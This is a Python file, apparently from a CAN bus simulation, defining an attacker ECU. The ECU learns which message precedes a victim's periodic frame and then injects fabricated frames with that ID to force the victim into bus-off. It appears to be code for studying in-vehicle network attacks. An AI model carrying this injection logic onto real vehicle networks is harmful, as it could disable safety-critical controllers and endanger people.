import time
from ecu import ECU

class AttackerECU(ECU):
    def __init__(self, name, bus):
        super().__init__(name, bus)
        self.observed_patterns = {}  # Tracks periodic messages and precedents
        self.target_pattern = None  # Stores identified target pattern (if found)

    def analyze_pattern(self, frames, victim):
        """Analyze bus traffic to identify periodic patterns and preceded messages."""
        for i in range(1, len(frames)):
            # Check if the frame is a periodic message
            if frames[i]["id"] in [p[0] for p in victim.periodic_frames]:  # Check if periodic
                precedent = frames[i - 1]["id"]
                if frames[i]["id"] not in self.observed_patterns:
                    self.observed_patterns[frames[i]["id"]] = {}

                if precedent not in self.observed_patterns[frames[i]["id"]]:
                    self.observed_patterns[frames[i]["id"]][precedent] = 0
                self.observed_patterns[frames[i]["id"]][precedent] += 1

        # Identify a consistent pattern
        for periodic_id, precedents in self.observed_patterns.items():
            for precedent_id, count in precedents.items():
                if count > 5:  # Arbitrary threshold for identifying a pattern
                    self.target_pattern = (periodic_id, precedent_id)
                    print(f"[{self.name}] Target pattern identified: "
                          f"Periodic ID {periodic_id}, Preceded by {precedent_id}")
                    return self.target_pattern
        return None

    def execute_attack(self, victim):
        """Launch the attack based on identified pattern."""
        if not self.target_pattern:
            print(f"[{self.name}] No pattern identified, no attack launched.")
            return

        periodic_id, precedent_id = self.target_pattern
        while not victim.is_bus_off:
            frame = self.bus.receive_frame()
            if frame and frame["id"] == precedent_id:
                time.sleep(0.01)  # Simulate the delay after precedent message
                fabricated_frame = {"id": periodic_id, "data": [0xFF, 0xFF], "dlc": 2}
                self.send(fabricated_frame)
                print(f"[{self.name}] Injected fabricated frame: {fabricated_frame}")
